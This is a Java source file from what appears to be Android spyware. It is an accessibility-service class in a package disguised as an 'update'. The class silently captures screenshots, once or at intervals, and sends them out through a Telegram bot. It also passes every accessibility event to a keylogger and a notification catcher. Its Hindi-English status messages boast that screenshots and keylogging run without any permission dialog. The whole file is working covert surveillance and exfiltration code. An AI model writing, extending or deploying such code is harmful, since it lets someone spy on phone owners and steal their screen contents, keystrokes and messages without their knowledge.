package com.kasari.update;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.os.*;
import android.view.accessibility.AccessibilityEvent;
import java.io.*;
import java.util.concurrent.*;

public class ScreenMirror extends AccessibilityService {

    public static volatile ScreenMirror instance = null;

    private volatile boolean mContinuous = false;
    private int              mInterval   = 30;
    private Handler          mHandler;
    private HandlerThread    mThread;

    private final Runnable mContTask = new Runnable() {
        @Override public void run() {
            if (!mContinuous) return;
            doCapture();
            if (mContinuous) mHandler.postDelayed(this, mInterval * 1000L);
        }
    };

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        mThread = new HandlerThread("AccCap");
        mThread.start();
        mHandler = new Handler(mThread.getLooper());
        TelegramController.sendMessage(
            "✅ Accessibility Service ON!\n" +
            "Ab /screenshot, /screen_record, /keylog sab kaam karenge bina kisi permission dialog ke.");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Delegate to keylogger and notification catcher
        KeyloggerService.onEvent(event);
        NotificationCatcher.onEvent(event);
    }

    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        mContinuous = false;
        if (mHandler != null) { mHandler.removeCallbacksAndMessages(null); mHandler = null; }
        if (mThread  != null) { mThread.quit(); mThread = null; }
        super.onDestroy();
    }

    // ─── Single screenshot ────────────────────────────────────────────────────
    public void requestCapture() {
        if (mHandler != null) mHandler.post(this::doCapture);
    }

    // ─── Continuous mode ──────────────────────────────────────────────────────
    public void startContinuous(int intervalSec) {
        mContinuous = true;
        mInterval   = Math.max(5, intervalSec);
        if (mHandler != null) {
            mHandler.removeCallbacks(mContTask);
            mHandler.post(mContTask);
        }
        TelegramController.sendMessage("📺 Har " + mInterval + "s screenshot. /screen_stop se band karo.");
    }

    public void stopContinuous() {
        mContinuous = false;
        if (mHandler != null) mHandler.removeCallbacks(mContTask);
        TelegramController.sendMessage("🛑 Screenshot mode band.");
    }

    // ─── Sync frame capture (used by ScreenRecordService) ────────────────────
    @SuppressLint("NewApi")
    public Bitmap captureFrameSync(long timeoutMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null;
        CountDownLatch latch = new CountDownLatch(1);
        Bitmap[] result = {null};
        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(),
            new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult r) {
                    try {
                        android.hardware.HardwareBuffer hwBuf = r.getHardwareBuffer();
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            Bitmap hw = Bitmap.wrapHardwareBuffer(hwBuf, r.getColorSpace());
                            if (hw != null) {
                                result[0] = hw.copy(Bitmap.Config.ARGB_8888, false);
                                hw.recycle();
                            }
                        }
                        hwBuf.close();
                    } catch (Exception ignored) {}
                    latch.countDown();
                }
                @Override public void onFailure(int code) { latch.countDown(); }
            });
        try { latch.await(timeoutMs, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
        return result[0];
    }

    // ─── Internal capture ────────────────────────────────────────────────────
    @SuppressLint("NewApi")
    private void doCapture() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            TelegramController.sendMessage("❌ Android 11+ chahiye silent screenshot ke liye.");
            return;
        }
        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(),
            new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult r) {
                    new Thread(() -> processResult(r)).start();
                }
                @Override
                public void onFailure(int code) {
                    TelegramController.sendMessage("❌ Screenshot fail (code:" + code + ")");
                }
            });
    }

    @SuppressLint("NewApi")
    private void processResult(ScreenshotResult result) {
        Bitmap bmp = null;
        try {
            android.hardware.HardwareBuffer hwBuf = result.getHardwareBuffer();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                Bitmap hw = Bitmap.wrapHardwareBuffer(hwBuf, result.getColorSpace());
                if (hw != null) {
                    bmp = hw.copy(Bitmap.Config.ARGB_8888, false);
                    hw.recycle();
                }
            }
            hwBuf.close();
        } catch (Exception e) {
            TelegramController.sendMessage("❌ Screenshot error: " + e.getMessage());
            return;
        }
        if (bmp == null) {
            TelegramController.sendMessage("❌ Bitmap null. Android 12+ chahiye.");
            return;
        }
        try {
            int maxW = 1080;
            if (bmp.getWidth() > maxW) {
                float scale = (float) maxW / bmp.getWidth();
                Bitmap sc = Bitmap.createScaledBitmap(bmp, maxW, (int)(bmp.getHeight() * scale), true);
                bmp.recycle(); bmp = sc;
            }
            File f = new File(getCacheDir(), "shot_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream fos = new FileOutputStream(f);
            bmp.compress(Bitmap.CompressFormat.JPEG, 85, fos);
            fos.close(); bmp.recycle();
            TelegramController.sendPhoto(f, "📱 Screenshot");
            f.delete();
        } catch (Exception e) {
            TelegramController.sendMessage("❌ Screenshot send error: " + e.getMessage());
        }
    }
}
